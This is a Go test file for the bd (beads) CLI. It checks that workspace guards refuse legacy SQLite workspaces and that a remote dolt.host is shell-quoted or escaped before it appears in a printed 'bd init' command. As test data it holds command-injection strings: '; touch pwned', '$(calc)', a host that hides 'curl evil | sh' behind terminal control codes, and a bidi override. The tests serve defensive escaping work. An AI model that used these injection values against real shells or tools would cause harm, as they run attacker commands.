//go:build cgo

package main

import (
	"bytes"
	"context"
	"errors"
	"maps"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/steveyegge/beads/internal/remedy"
	"github.com/steveyegge/beads/internal/testutil/legacyworkspace"
)

func TestHandleWorkspaceGuardErrorExitCodes(t *testing.T) {
	if err := handleWorkspaceGuardError(nil); err != nil {
		t.Fatalf("handleWorkspaceGuardError(nil) = %v", err)
	}
	tests := []struct {
		name string
		err  error
		want int
	}{
		{name: "legacy refusal", err: legacyUpgradeRefusal("legacy Dolt workspace"), want: 1},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var got error
			stderr := captureStderr(t, func() { got = handleWorkspaceGuardError(tt.err) })
			if code, ok := exitCodeFromError(got); !ok || code != tt.want {
				t.Fatalf("exit code = %d (%v), want %d", code, ok, tt.want)
			}
			if !strings.Contains(stderr, "Error: "+tt.err.Error()) {
				t.Fatalf("stderr does not carry the refusal:\n%s", stderr)
			}
		})
	}
}

// Error framing and the bd dolt diagnostics read a workspace's metadata outside
// the store factories: framing names the backend of an open that may have just
// been refused, and bd dolt show and status, which admission guards already,
// load and validate it again. None of them may migrate a historical SQLite
// workspace's legacy config.json into metadata.json, and the diagnostics refuse
// it with admission's refusal and exit code. Each layout has metadata, so
// BEADS_DIR selects it.
func TestWorkspaceMetadataReadersLeaveHistoricalSQLiteWorkspaceUnchanged(t *testing.T) {
	pinLegacyUpgradeGuardEnv(t)
	requireLegacyRefusal := func(t *testing.T, name string, run func() error) {
		t.Helper()
		var err error
		stderr := captureStderr(t, func() { err = run() })
		if code, ok := exitCodeFromError(err); !ok || code != 1 {
			t.Fatalf("%s exit code = %d (%v), want 1", name, code, ok)
		}
		if !strings.Contains(stderr, "Error: "+legacyworkspace.HistoricalSQLiteRefusal) {
			t.Fatalf("%s did not print admission's refusal:\n%s", name, stderr)
		}
	}
	readers := map[string]func(t *testing.T, beadsDir string){
		"error framing": func(t *testing.T, beadsDir string) {
			_ = backendNameForErrorFraming(beadsDir)
		},
		"dolt backend config": func(t *testing.T, beadsDir string) {
			if _, err := loadDoltBackendConfig(beadsDir); !isLegacyUpgradeRefusal(err) {
				t.Fatalf("loadDoltBackendConfig = %v, want admission's legacy refusal", err)
			}
		},
		"dolt show": func(t *testing.T, _ string) {
			requireLegacyRefusal(t, "bd dolt show", func() error { return showDoltConfig(false) })
		},
		"dolt status": func(t *testing.T, _ string) {
			requireLegacyRefusal(t, "bd dolt status", func() error { return doltStatusCmd.RunE(doltStatusCmd, nil) })
		},
	}
	for _, layout := range legacyworkspace.HistoricalSQLiteLayouts() {
		if _, ok := layout.Files["vc.db"]; ok {
			// Metadata-less: discovery does not select it, so nothing reads it.
			continue
		}
		for name, read := range readers {
			t.Run(layout.Name+"/"+name, func(t *testing.T) {
				beadsDir := filepath.Join(t.TempDir(), ".beads")
				layout.Write(t, beadsDir)
				t.Setenv("BEADS_DIR", beadsDir)
				before := legacyworkspace.TreeDigest(t, beadsDir)
				read(t, beadsDir)
				if after := legacyworkspace.TreeDigest(t, beadsDir); !maps.Equal(after, before) {
					t.Fatalf("%s changed the workspace: before %v, after %v", name, before, after)
				}
			})
		}
	}
}

// bd connect checks the workspace it attaches before its handshake, and again
// once the handshake returns: the workspace can change while the handshake is
// in flight. A historical SQLite workspace that appears meanwhile is refused
// with admission's refusal and exit code 1 before connect writes anything
// there: the workspace keeps exactly the layout that appeared, with no
// .gitignore, sidecar or metadata.json of connect's.
func TestConnectRefusesAHistoricalSQLiteWorkspaceAppearingDuringItsHandshake(t *testing.T) {
	bd := buildBDUnderTest(t)
	const handshake = `{"api_version":"v0","backend":"dolt","bd_version":"9.9.9",` +
		`"beads_dir":"/srv/.beads","capabilities":["issues.get"],"database":"beads",` +
		`"dolt_mode":"server","project_id":"proj-legacy-race","repo_root":"/srv",` +
		`"schema_version":1,"wire_revision":1,"min_client_wire_revision":1}`
	// write lays layout down as another process would, without a *testing.T:
	// it runs on the server's goroutine.
	write := func(layout legacyworkspace.Layout, beadsDir string) error {
		for name, content := range layout.Files {
			path := filepath.Join(beadsDir, filepath.FromSlash(name))
			if err := os.MkdirAll(filepath.Dir(path), 0o750); err != nil {
				return err
			}
			if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
				return err
			}
		}
		return nil
	}
	for _, layout := range legacyworkspace.HistoricalSQLiteLayouts() {
		for _, flags := range [][]string{nil, {"--json"}} {
			t.Run(layout.Name+"/connect"+strings.Join(flags, ""), func(t *testing.T) {
				repoDir := t.TempDir()
				initGitRepoAt(t, repoDir)
				beadsDir := filepath.Join(repoDir, ".beads")
				// The workspace as the other process alone leaves it.
				appearedDir := filepath.Join(t.TempDir(), ".beads")
				if err := write(layout, appearedDir); err != nil {
					t.Fatal(err)
				}
				want := legacyworkspace.TreeDigest(t, appearedDir)
				appeared := make(chan error, 1)
				server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
					if r.URL.Path != "/v0/beads/context" {
						http.NotFound(w, r)
						return
					}
					select {
					case appeared <- write(layout, beadsDir):
					default:
					}
					w.Header().Set("Content-Type", "application/json")
					_, _ = w.Write([]byte(handshake))
				}))
				t.Cleanup(server.Close)
				args := append(append([]string{"connect"}, flags...), server.URL)

				ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
				defer cancel()
				cmd := exec.CommandContext(ctx, bd, args...)
				cmd.Dir = repoDir
				cmd.Env = append(bdEnv(t.TempDir()), "BEADS_DOLT_SERVER_MODE=0", "BEADS_DOLT_SHARED_SERVER=0")
				var output bytes.Buffer
				cmd.Stdout = &output
				cmd.Stderr = &output
				err := cmd.Run()
				if ctx.Err() != nil {
					t.Fatalf("bd %s did not finish promptly: %v\n%s", strings.Join(args, " "), ctx.Err(), output.String())
				}
				var exitErr *exec.ExitError
				if !errors.As(err, &exitErr) || exitErr.ExitCode() != 1 {
					t.Fatalf("bd %s = %v, want exit 1\n%s", strings.Join(args, " "), err, output.String())
				}
				select {
				case err := <-appeared:
					if err != nil {
						t.Fatalf("writing the workspace during the handshake: %v", err)
					}
				default:
					t.Fatalf("bd %s never reached its handshake, so the late refusal went unexercised\n%s", strings.Join(args, " "), output.String())
				}
				if !strings.Contains(output.String(), ": "+legacyworkspace.HistoricalSQLiteRefusal) {
					t.Fatalf("bd %s did not print admission's refusal, naming the workspace:\n%s", strings.Join(args, " "), output.String())
				}
				if got := legacyworkspace.TreeDigest(t, beadsDir); !maps.Equal(got, want) {
					t.Fatalf("refused bd %s changed the workspace: got %v, want %v\n%s", strings.Join(args, " "), slices.Sorted(maps.Keys(got)), slices.Sorted(maps.Keys(want)), output.String())
				}
			})
		}
	}
}

// A create target whose legacy config.json does not load is not refused by the
// discovery check ensureBeadsDirForPath runs first (checkDiscoveredForOpen): it
// is left to what follows, here the not-auto-created refusal of a target
// allowCreate rules out.
func TestEnsureBeadsDirForPathLeavesUnloadableLegacyConfigToItsLoad(t *testing.T) {
	targetDir := t.TempDir()
	beadsDir := filepath.Join(targetDir, ".beads")
	if err := os.MkdirAll(beadsDir, 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(beadsDir, "config.json"), []byte(`{"backend":"dolt",`), 0o600); err != nil {
		t.Fatal(err)
	}
	// allowCreate=false stops just after the discovery check, before anything
	// is created, so the result shows which branch ran.
	err := ensureBeadsDirForPath(context.Background(), targetDir, nil, false)
	if err == nil || isLegacyUpgradeRefusal(err) || !strings.Contains(err.Error(), "no beads workspace found") {
		t.Fatalf("ensureBeadsDirForPath() = %v, want the not-auto-created refusal", err)
	}
}

// A create target whose .beads has no metadata.json is refused, with nothing
// written, when initializing it would hide what bd run there already reads:
// its own config selects Dolt server mode, by dolt.mode or, with no dolt.mode,
// by a non-local dolt.host (config.local.yaml beside config.yaml outranks it;
// a lone config.local.yaml is not read, as bd's own config merge does not read
// one), its config cannot be read (a section whose children are all commented
// out reads as unset, as bd reads it), bd's own
// admission refuses it, or it holds several databases. Server mode is decided
// first, from the target's own config, so a server workspace bd's admission
// would misread as legacy from the launcher's mode gets the server refusal.
// The bd init remedy for a remote dolt.host names the host quoted for the
// shell, or a <host> placeholder the refusal names when no shell takes it
// quoted, and the port the target's own config names (else 3307), so a local
// server's stale dolt-server.port beside it is never dialed on that host.
func TestEnsureBeadsDirForPathRefusesTargetsItWouldHide(t *testing.T) {
	writeFiles := func(t *testing.T, beadsDir string, files map[string]string) {
		t.Helper()
		for name, content := range files {
			path := filepath.Join(beadsDir, name)
			if err := os.MkdirAll(filepath.Dir(path), 0o750); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
				t.Fatal(err)
			}
		}
	}
	// databaseMarker is the file embeddeddolt.Databases looks for to count an
	// embedded database.
	databaseMarker := func(database string) string {
		return filepath.Join("embeddeddolt", database, ".dolt", "noms", "manifest")
	}
	// remote is the --server-host/--server-port pair a remedy names: the host
	// quoted for this host's shell, or the <host> placeholder where that shell
	// cannot take it quoted (TestServerInitRemedy pins which, on both
	// platforms).
	remote := func(host string, port int) string {
		quoted, ok := remedy.ShellQuotedFor(runtime.GOOS, host)
		if !ok {
			quoted = "<host>"
		}
		return "--server-host " + quoted + " --server-port " + strconv.Itoa(port)
	}
	// craftedName is how a refusal names the dolt.host x\'; $(calc), which no
	// shell on either platform takes quoted (TestEscapedValue).
	const craftedName = `"x\\\x27\x3b \x24(calc)"`
	for _, tc := range []struct {
		name  string
		files map[string]string
		want  string // "" = not refused
	}{
		{name: "server mode in config.yaml", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n"}, want: "Run: bd init --database <name> there"},
		{name: "server mode with a local dolt.host", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n  host: 127.0.0.1\n"}, want: "Run: bd init --database <name> there"},
		{name: "server mode with a remote dolt.host", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n  host: db.example.com\n"}, want: "Run: bd init " + remote("db.example.com", 3307) + " --database <name> there"},
		{name: "server mode with a remote dolt.host beside a stale port file", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n  host: db.example.com\n  port: 3310\n", "dolt-server.port": "45678\n"}, want: "Run: bd init " + remote("db.example.com", 3310) + " --database <name> there"},
		{name: "server mode with an unreadable dolt.host", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n  host: [a, b]\n"}, want: "Run: bd init --database <name> there"},
		{name: "server mode in dotted config.yaml", files: map[string]string{"config.yaml": "dolt.mode: SERVER\n"}, want: "selects Dolt server mode"},
		{name: "server mode in config.local.yaml", files: map[string]string{"config.yaml": "dolt:\n  mode: embedded\n", "config.local.yaml": "dolt:\n  mode: server\n"}, want: "selects Dolt server mode"},
		{name: "lone config.local.yaml", files: map[string]string{"config.local.yaml": "dolt:\n  mode: server\n"}},
		{name: "embedded mode in config.yaml", files: map[string]string{"config.yaml": "dolt:\n  mode: embedded\n"}},
		{name: "unreadable config.yaml", files: map[string]string{"config.yaml": "dolt: [unterminated\n"}, want: "dolt.mode cannot be read"},
		{name: "commented-out dolt section", files: map[string]string{"config.yaml": "dolt:\n  # mode: server\n"}},
		{name: "remote dolt.host in config.yaml", files: map[string]string{"config.yaml": "dolt:\n  host: db.example.com\n  port: 3307\n"}, want: "selects Dolt server mode (dolt.host: \"db.example.com\"); not initializing it as an embedded workspace, which would hide its server data. Run: bd init --server " + remote("db.example.com", 3307) + " --database <name> there"},
		{name: "remote dolt.host and no dolt.port beside a stale port file", files: map[string]string{"config.yaml": "dolt:\n  host: db.example.com\n", "dolt-server.port": "45678\n"}, want: "Run: bd init --server " + remote("db.example.com", 3307) + " --database <name> there"},
		{name: "remote dolt.host with a dolt.port that is not a port", files: map[string]string{"config.yaml": "dolt:\n  host: db.example.com\n  port: none\n"}, want: "Run: bd init --server " + remote("db.example.com", 3307) + " --database <name> there"},
		{name: "remote dolt.host in config.local.yaml", files: map[string]string{"config.yaml": "dolt:\n  host: 127.0.0.1\n", "config.local.yaml": "dolt:\n  host: 10.0.0.5\n"}, want: "Run: bd init --server " + remote("10.0.0.5", 3307) + " --database <name> there"},
		{name: "dolt.port in config.local.yaml", files: map[string]string{"config.yaml": "dolt:\n  host: db.example.com\n  port: 3311\n", "config.local.yaml": "dolt:\n  port: 3312\n"}, want: "Run: bd init --server " + remote("db.example.com", 3312) + " --database <name> there"},
		// The host is the target repository's content, pasted into a command.
		// It is named escaped (TestEscapedValue) beside the command too.
		{name: "remote dolt.host a shell would split", files: map[string]string{"config.yaml": "dolt:\n  host: \"db.example.com; touch pwned\"\n"}, want: "(dolt.host: \"db.example.com\\x3b touch pwned\"); not initializing it as an embedded workspace, which would hide its server data. Run: bd init --server " + remote("db.example.com; touch pwned", 3307) + " --database <name> there"},
		// One no shell on either platform takes quoted (TestShellQuotedFor) is
		// left as a placeholder the refusal names, on every platform.
		{name: "remote dolt.host no shell takes quoted", files: map[string]string{"config.yaml": "dolt:\n  host: \"x\\\\'; $(calc)\"\n"}, want: "(dolt.host: " + craftedName + "); not initializing it as an embedded workspace, which would hide its server data. Run: bd init --server --server-host <host> --server-port 3307 --database <name> there with its dolt.host " + craftedName + " for <host>, naming the server database it uses"},
		{name: "server mode with a remote dolt.host no shell takes quoted", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n  host: \"x\\\\'; $(calc)\"\n"}, want: "Run: bd init --server-host <host> --server-port 3307 --database <name> there with its dolt.host " + craftedName + " for <host>, naming the server database it uses"},
		// The remedy names the target's dolt.host whenever bd does not run its
		// server there (configfile.BdRunsServerAt): bd init dials 127.0.0.1
		// otherwise and would initialize bd's own server instead of the one
		// the target names. The IPv6 loopback and another loopback address
		// are on this machine, but bd's own server never listens there.
		{name: "server mode with an IPv6 loopback dolt.host", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n  host: \"::1\"\n  port: 23417\n"}, want: "Run: bd init " + remote("::1", 23417) + " --database <name> there"},
		{name: "server mode with a bracketed IPv6 loopback dolt.host", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n  host: \"[::1]\"\n  port: 23417\n"}, want: "Run: bd init " + remote("[::1]", 23417) + " --database <name> there"},
		{name: "server mode with a long-form IPv6 loopback dolt.host", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n  host: \"0:0:0:0:0:0:0:1\"\n"}, want: "Run: bd init " + remote("0:0:0:0:0:0:0:1", 3307) + " --database <name> there"},
		{name: "server mode with another loopback dolt.host", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n  host: 127.0.0.2\n"}, want: "Run: bd init " + remote("127.0.0.2", 3307) + " --database <name> there"},
		{name: "server mode with an upper-case localhost dolt.host", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n  host: LOCALHOST\n"}, want: "Run: bd init --database <name> there"},
		{name: "IPv6 loopback dolt.host without dolt.mode", files: map[string]string{"config.yaml": "dolt:\n  host: \"::1\"\n"}},
		{name: "another loopback dolt.host without dolt.mode", files: map[string]string{"config.yaml": "dolt:\n  host: 127.0.0.2\n"}, want: "Run: bd init --server " + remote("127.0.0.2", 3307) + " --database <name> there"},
		{name: "local dolt.host 127.0.0.1", files: map[string]string{"config.yaml": "dolt:\n  host: 127.0.0.1\n"}},
		{name: "local dolt.host localhost", files: map[string]string{"config.yaml": "dolt.host: localhost\n"}},
		{name: "remote dolt.host under embedded mode", files: map[string]string{"config.yaml": "dolt:\n  mode: embedded\n  host: db.example.com\n"}},
		{name: "unreadable dolt.host", files: map[string]string{"config.yaml": "dolt:\n  host: [a, b]\n"}, want: "dolt.host cannot be read"},
		{name: "server mode beside a legacy dolt root", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n", "dolt/leftover": "x"}, want: "selects Dolt server mode"},
		{name: "several databases", files: map[string]string{databaseMarker("beads"): "x", databaseMarker("other"): "x"}, want: "holds several databases (beads, other)"},
		{name: "sqlite-era repo", files: map[string]string{"config.json": `{"database":"beads.db"}`, "beads.db": "SQLite format 3\x00" + strings.Repeat("\x00", 4080)}, want: "historical SQLite workspace"},
		// A clone of a project from before bd wrote config.json holds only its
		// tracked issues.jsonl: bd run there finds no workspace, and the
		// database written here would keep bd's upgrade auto-import, which
		// loads issues.jsonl only into an empty database, from ever loading it.
		{name: "issues.jsonl and no database", files: legacyworkspace.PreConfigJSONClone().Files, want: "it has issues.jsonl but no database (a fresh clone of a project from before bd wrote config.json, say), so bd run there does not treat it as a workspace; not initializing it, which would hide what it holds behind an empty database. Run `bd init --from-jsonl` in "},
		// An empty .beads (contributor setup leaves one), an empty
		// issues.jsonl, which holds nothing to hide, and a redirect stub,
		// whose own files bd run there never reads, are initialized as before.
		{name: "empty .beads"},
		{name: "empty issues.jsonl", files: map[string]string{"issues.jsonl": ""}},
		// An issues.jsonl that is not a regular file is no tracked export.
		{name: "issues.jsonl directory", files: map[string]string{"issues.jsonl/keep": ""}},
		// A config.yaml beside issues.jsonl makes it a workspace to discovery
		// (beads.HasProjectFiles), so it is initialized as before.
		{name: "config.yaml beside issues.jsonl", files: map[string]string{"config.yaml": "dolt:\n  mode: embedded\n", "issues.jsonl": `{"id":"old-1"}` + "\n"}},
		{name: "issues.jsonl in a redirect stub", files: map[string]string{"redirect": "shared/.beads\n", "issues.jsonl": `{"id":"old-1","title":"stub"}` + "\n", "../shared/.beads/metadata.json": `{"backend":"dolt"}`}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			targetDir := t.TempDir()
			beadsDir := filepath.Join(targetDir, ".beads")
			if err := os.MkdirAll(beadsDir, 0o750); err != nil {
				t.Fatal(err)
			}
			writeFiles(t, beadsDir, tc.files)
			before := planningDirListing(t, beadsDir)

			// A nil source store initializes nothing past these refusals,
			// so a target that is not refused is left with no metadata.json.
			err := ensureBeadsDirForPath(context.Background(), targetDir, nil, true)
			switch {
			case tc.want == "" && err != nil:
				t.Fatalf("ensureBeadsDirForPath() = %v, want nil", err)
			case tc.want != "" && (err == nil || !strings.Contains(err.Error(), tc.want)):
				t.Fatalf("ensureBeadsDirForPath() = %v, want a refusal containing %q", err, tc.want)
			}
			if tc.want != "" {
				if after := planningDirListing(t, beadsDir); !slices.Equal(after, before) {
					t.Errorf(".beads after a refused initialization = %v, want unchanged %v", after, before)
				}
			}
		})
	}
}

// TestServerInitRemedy pins the bd init remedy for a metadata-less target whose
// config selects Dolt server mode, on both platforms: a remote dolt.host is
// passed quoted for the shell it is pasted into (TestShellQuotedFor), with the
// port the target's own config names, else 3307. A host no quoting passes on
// unchanged there, such as one that would run a command from cmd.exe,
// PowerShell or fish, pass bd init a second argument through a .cmd shim, or
// redraw or reorder the printed command with terminal control characters or
// U+202E, is left as a <host> placeholder that the note names escaped, with
// every character a shell acts on escaped too (TestEscapedValue).
func TestServerInitRemedy(t *testing.T) {
	t.Parallel()
	const crafted = `x" & calc & "$(calc)`
	for _, tc := range []struct {
		name, goos, initCmd, host, configYAML string
		want, wantNote                        string
	}{
		{name: "no remote host", goos: "windows", initCmd: "bd init", want: "bd init --database <name>"},
		{name: "remote host on POSIX", goos: "linux", initCmd: "bd init --server", host: "db.example.com", want: "bd init --server --server-host 'db.example.com' --server-port 3307 --database <name>"},
		{name: "remote host and port on Windows", goos: "windows", initCmd: "bd init --server", host: "db.example.com", configYAML: "dolt:\n  port: 3310\n", want: `bd init --server --server-host "db.example.com" --server-port 3310 --database <name>`},
		{name: "crafted host on POSIX", goos: "darwin", initCmd: "bd init", host: crafted, want: `bd init --server-host 'x" & calc & "$(calc)' --server-port 3307 --database <name>`},
		{name: "crafted host on Windows", goos: "windows", initCmd: "bd init --server", host: crafted, want: "bd init --server --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "x\x22 \x26 calc \x26 \x22\x24(calc)" for <host>`},
		{name: "PowerShell subexpression host on Windows", goos: "windows", initCmd: "bd init", host: "$(calc)", want: "bd init --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "\x24(calc)" for <host>`},
		{name: "host a .cmd shim would split on Windows", goos: "windows", initCmd: "bd init", host: "db.example.com;--recreate-missing", want: "bd init --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "db.example.com\x3b--recreate-missing" for <host>`},
		{name: "host with terminal control characters on POSIX", goos: "linux", initCmd: "bd init", host: "\x1b[2K\rbd init --server-host db; curl evil | sh #", want: "bd init --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "\x1b[2K\rbd init --server-host db\x3b curl evil \x7c sh #" for <host>`},
		{name: "host fish would end the quotes at on POSIX", goos: "linux", initCmd: "bd init --server", host: `x\'; calc #`, want: "bd init --server --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "x\\\x27\x3b calc #" for <host>`},
		{name: "host PowerShell would end the quotes at on POSIX", goos: "darwin", initCmd: "bd init", host: "x'; calc #", want: "bd init --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "x\x27\x3b calc #" for <host>`},
		{name: "host with a bidi override on Windows", goos: "windows", initCmd: "bd init --server", host: "db\u202e.example.com", want: "bd init --server --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "db\u202e.example.com" for <host>`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			beadsDir := t.TempDir()
			if tc.configYAML != "" {
				if err := os.WriteFile(filepath.Join(beadsDir, "config.yaml"), []byte(tc.configYAML), 0o600); err != nil {
					t.Fatal(err)
				}
			}
			got, gotNote := serverInitRemedy(tc.goos, tc.initCmd, beadsDir, tc.host)
			if got != tc.want || gotNote != tc.wantNote {
				t.Errorf("serverInitRemedy(%q, %q, host %q) = %q, %q\nwant %q, %q", tc.goos, tc.initCmd, tc.host, got, gotNote, tc.want, tc.wantNote)
			}
		})
	}
}

// TestRefuseUninitializableTargetEscapesItsPath pins that both server-mode
// refusals name a target whose path holds a control character escaped
// (remedy.PrintedValue), so the path printed ahead of the bd init remedy cannot
// redraw it.
func TestRefuseUninitializableTargetEscapesItsPath(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("a Windows file name cannot hold a control character")
	}
	t.Parallel()
	for name, configYAML := range map[string]string{
		"dolt.mode: server": "dolt:\n  mode: server\n",
		"remote dolt.host":  "dolt:\n  host: db.example.com\n",
	} {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			repo := filepath.Join(t.TempDir(), "repo\x1b[2K\rbd init --database beads #")
			beadsDir := filepath.Join(repo, ".beads")
			if err := os.MkdirAll(beadsDir, 0o750); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(filepath.Join(beadsDir, "config.yaml"), []byte(configYAML), 0o600); err != nil {
				t.Fatal(err)
			}
			err := refuseUninitializableTarget(beadsDir)
			want := strconv.Quote(repo) + " has no metadata.json and its own config selects Dolt server mode"
			if err == nil || !strings.HasPrefix(err.Error(), want) || strings.ContainsAny(err.Error(), "\x1b\r") {
				t.Fatalf("refuseUninitializableTarget() = %q, want a refusal starting %q, with no raw ESC or CR", err, want)
			}
		})
	}
}
